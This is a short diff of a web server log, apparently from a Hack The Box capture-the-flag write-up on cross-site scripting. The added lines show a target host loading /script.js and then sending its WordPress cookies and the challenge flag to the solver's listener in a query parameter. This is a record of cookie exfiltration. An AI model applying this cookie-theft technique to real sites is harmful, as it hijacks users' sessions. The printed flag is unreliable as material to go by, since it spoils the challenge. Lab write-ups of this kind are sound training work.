@@ -9,3 +9,11 @@
 [Wed Nov 25 09:17:54 2026] 10.129.234.166:51850 Accepted
 [Wed Nov 25 09:17:54 2026] 10.129.234.166:51850 Closed without sending a request; it was probably just an unused speculative preconnection
 [Wed Nov 25 09:17:54 2026] 10.129.234.166:51850 Closing
+
+=> source nằm ở web
+
+[Wed Nov 25 09:22:29 2026] 10.129.234.166:51986 [200]: GET /script.js
+[Wed Nov 25 09:22:29 2026] 10.129.234.166:51986 Closing
+[Wed Nov 25 09:22:29 2026] 10.129.234.166:51988 Accepted
+[Wed Nov 25 09:22:30 2026] 10.129.234.166:51988 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1795573351;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}                  
+[Wed Nov 25 09:22:30 2026] 10.129.234.166:51988 Closing
